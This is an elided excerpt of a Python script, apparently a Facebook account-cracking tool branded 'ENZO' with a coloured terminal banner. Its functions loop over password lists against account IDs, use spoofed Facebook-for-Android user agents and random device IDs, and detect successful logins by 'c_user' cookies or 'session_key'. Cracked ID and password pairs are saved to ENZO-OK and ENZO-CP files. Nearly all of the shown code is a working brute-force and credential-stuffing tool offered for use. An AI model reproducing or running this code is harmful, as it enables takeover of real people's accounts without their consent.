...
\033[1;32m================\033[1;32m===========\033[1;32m================================
               \033[1;32mVERISION\033[1;31m : \033[1;32m5.8.3
\033[1;32m================\033[1;32m===========\033[1;32m================================
 \033[1;32m[=]\033[1;33m DEVLOPER \033[1;31m: \033[1;32mNAUVLE
 \033[1;32m[=]\033[1;32m FACEBOOK \033[1;31m: \033[1;32mNAUVLE
 \033[1;32m[=]\033[1;32m SISTER\033[1;31m   : \033[1;32m
...
def ENZO():
	...
	if me in ["1", "01","11","A","a"]:
		clear();print("\033[1;32m [=]\033[1;37m FOR EXAMPLE : \033[1;32m/sdcard/ENZO.txt");linex()
...
def ffb(ids,names,passlist):
        global loop,oks,cps
        sys.stdout.write(f'\r\r\033[1;37m [ENZO] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
        ...
        try:
                ...
                for fikr in passlist:
                        ...
                        if "c_user" in Shahin:
                                ...
                                print(f'\r\r\033[1;32m [ENZO-OK] %s | %s'%(ids,pas))
                                print('\033[1;96m ======================================================')
                                open(f'/sdcard/ENZO-OK.txt', 'a').write(ids+'|'+pas+'\n')
                                #cek_apk(session,coki)
                                oks.append(ids)
                                break
                        elif 'checkpoint' in Shahin:
                                if 'y' in pcp:
                                        print(f'\r\r\x1b[38;5;126m [ENZO-CP] '+ids+' | '+pas+'\033[1;97m')
                                        print('\033[1;91m ======================================================')
                                        open(f'/sdcard/ENZO-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                        cps.append(ids)
                                        break
                                else:
                                        break
...
def api(ids,names,passlist):
                try:
                        ...
                        for pw in passlist:
                                ...
                                q = json.loads(po)
                                if 'session_key' in q:
                                        print(f'\r\r\033[1;32m [ENZO-OK] '+ids+' | '+pas+'\033[1;97m')
                                        print('\033[1;96m ======================================================')
                                        open(f'/sdcard/ENZO-OK.txt','a').write(ids+'|'+pas+'\n')
                                        #cek_apk(session,coki)
                                        oks.append(ids)
...
def api1(ids,names,passlist):
                try:
                        ...
                        for pw in passlist:
                                ...
                                gttt=random.choice(xxxxx)
                                android_version=str(random.randrange(6,13))
                                ua_string = f'DENZOk/2.1.0 (linex; U; Android {str(android_version)}.0.0; {str(gtt)} Build/{str(gttt)} [FBAN/FB4A;FBAV/{str(application_version)};FBBV/{str(application_version_code)};FBDM/'+'{density=2.0,width=720,height=1280};'+f'FBLC/es_CU;FBRV/{str(application_version_code)};FBCR/Movistar;FBMF/samsung;FBBD/samsung;FBPN/{str(fbs)};FBDV/{str(gtt)};FBSV/7.0;FBOP/1;FBCA/armeabi-v7a:armeabi;]'
                                device_id = str(uuid.uuid4())
                                adid = str(uuid.uuid4())
                                data = {'adid':adid,
                                        'email':ids,
...
def rcrack_free(idf,pwv):
	...
	#		print(idf+'|'+ps)
			...
			if 'c_user' in log_cookies:
				...
				cid = coki[151:166]
				print('\n')
				print('\033[1;92m[ENZO-OK] '+idf+' | '+ps+'\033[0;97m')
				print('\033[1;96m ======================================================')
				cek_apk(coki)
				...
				cid = coki[141:156]
				print('\n')
				print('\033[1;91m[ENZO-CP] '+idf+' | '+ps+'\033[0;97m')
				print('\033[1;91m ======================================================')
